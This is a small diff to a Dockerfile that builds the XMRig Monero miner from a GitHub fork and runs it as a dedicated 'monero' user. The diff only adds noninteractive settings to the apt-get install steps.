@@ -2,7 +2,8 @@ FROM ubuntu:latest AS build
 
 ARG XMRIG_VERSION='v5.8.1'
 
-RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+RUN DEBIAN_FRONTEND=noninteractive apt-get update && \
+    DEBIAN_FRONTEND=noninteractive apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 WORKDIR /root
 RUN git clone https://github.com/bitbuyio/xmrig
 WORKDIR /root/xmrig
@@ -12,7 +13,9 @@ RUN git apply build.patch
 RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make
 
 FROM ubuntu:latest
-RUN apt-get update && apt-get install -y libhwloc5
+
+RUN DEBIAN_FRONTEND=noninteractive apt-get update && \
+    DEBIAN_FRONTEND=noninteractive apt-get install -y libhwloc5    
 RUN useradd -ms /bin/bash monero
 USER monero
 WORKDIR /home/monero
